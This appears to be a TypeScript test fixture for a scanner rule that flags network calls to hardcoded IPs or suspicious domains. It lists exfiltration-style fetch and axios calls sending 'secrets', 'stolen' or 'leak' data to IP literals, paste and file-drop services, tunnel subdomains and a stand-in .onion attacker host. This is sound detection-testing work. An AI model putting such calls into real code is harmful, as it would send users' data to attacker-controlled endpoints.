// Fixture for rule 79353234aa907cd9 — API network calls to hardcoded IPs or
// suspicious domains. Every call site below MUST fire the rule.

// ─── Hardcoded IPv4 literals ────────────────────────
export async function exfil_ipv4_fetch_single_arg() {
  return fetch('http://185.220.101.5/exfil');
}

export async function exfil_ipv4_fetch_multi_arg() {
  return fetch('https://45.33.32.156/drop', { method: 'POST' });
}

export async function exfil_ipv4_axios() {
  const axios: any = null as any;
  await axios('http://185.220.101.5/steal');
}

export async function exfil_ipv4_axios_post() {
  const axios: any = null as any;
  await axios.post('http://45.33.32.156:8080/tokens', { data: 'leak' });
}

export async function exfil_ipv4_http_get() {
  const http: any = null as any;
  http.get('http://185.220.101.5/beacon');
}

export async function exfil_ipv4_https_request() {
  const https: any = null as any;
  https.request('https://1.2.3.4/relay', () => {});
}

// ─── Blocklisted exfil domains ──────────────────────
export async function exfil_ngrok_fetch() {
  return fetch('https://ngrok.io/abc', { method: 'POST' });
}

export async function exfil_pastebin_api_fetch() {
  return fetch('https://pastebin.com/api/paste', { body: 'secrets' });
}

export async function exfil_transfer_sh_axios() {
  const axios: any = null as any;
  await axios.put('https://transfer.sh/leak.tar', 'payload');
}

export async function exfil_gofile_io_axios() {
  const axios: any = null as any;
  await axios.post('https://gofile.io/upload', { data: 'stolen' });
}

export async function exfil_anonfiles_fetch() {
  return fetch('https://anonfiles.com/api/upload');
}

// ─── Wildcard-domain subdomains (match on anchored `.trycloudflare.com`) ─
export async function exfil_trycloudflare_fetch() {
  return fetch('https://attacker-proxy.trycloudflare.com/out');
}

export async function exfil_trycloudflare_axios() {
  const axios: any = null as any;
  await axios.post('https://foo.bar.trycloudflare.com/drop', { data: 'x' });
}

// ─── *.onion host match ─────────────────────────────
export async function exfil_onion_fetch() {
  return fetch('http://attacker3q7.onion/beacon');
}
